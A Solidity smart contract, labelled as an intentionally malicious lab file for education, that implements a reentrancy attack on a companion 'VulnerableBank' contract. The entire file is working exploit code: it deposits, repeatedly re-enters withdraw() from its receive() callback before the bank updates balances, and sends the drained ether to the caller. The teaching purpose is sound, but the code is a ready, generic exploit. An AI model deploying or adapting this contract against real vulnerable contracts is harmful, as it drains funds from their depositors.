// SPDX-License-Identifier: MIT
pragma solidity 0.8.20;

/**
 * ⚠️ INTENTIONALLY VULNERABLE/MALICIOUS CONTRACT FOR EDUCATIONAL PURPOSES ONLY
 *
 * This contract demonstrates a reentrancy attack against VulnerableBank.sol
 * It shows how a malicious actor can drain funds by exploiting the vulnerability.
 *
 * DO NOT use in production or with real funds.
 * For education only. See lab README for details.
 */

interface IBank {
    function deposit() external payable;
    function withdraw(uint256 amount) external;
    function getUserBalance(address user) external view returns (uint256);
}

contract Attacker {
    IBank private bank;
    uint256 public attackCount = 0;
    uint256 public amountToWithdraw;

    event AttackInitiated(uint256 initialAmount);
    event ReentrancyCalled(uint256 callCount, uint256 currentBalance);
    event AttackComplete(uint256 totalDrained);

    constructor(address bankAddress) {
        bank = IBank(bankAddress);
    }

    /// @notice Initiate the reentrancy attack
    function attack(uint256 initialAmount) public payable {
        require(msg.value >= initialAmount, "Send enough ETH for initial deposit");

        amountToWithdraw = initialAmount;
        attackCount = 0;

        // Step 1: Deposit funds into the bank
        bank.deposit{value: initialAmount}();
        emit AttackInitiated(initialAmount);

        // Step 2: Initiate first withdrawal (this triggers the reentrancy)
        bank.withdraw(initialAmount);
    }

    /// @notice Receive callback - called when bank sends ETH via call{}
    /// This is where the reentrancy happens
    receive() external payable {
        attackCount++;
        emit ReentrancyCalled(attackCount, address(this).balance);

        // Step 3: While receiving ETH, call withdraw() again
        // The bank's balance hasn't been updated yet, so this succeeds!
        if (bank.getUserBalance(address(this)) >= amountToWithdraw && attackCount < 5) {
            bank.withdraw(amountToWithdraw);
        } else {
            // Limit to 5 calls to prevent infinite loops in testing
            emit AttackComplete(address(this).balance);
        }
    }

    /// @notice Get attacker's balance
    function getBalance() public view returns (uint256) {
        return address(this).balance;
    }

    /// @notice Withdraw stolen funds (for testing)
    function withdrawAll() public {
        (bool success, ) = msg.sender.call{value: address(this).balance}("");
        require(success, "Withdrawal failed");
    }
}
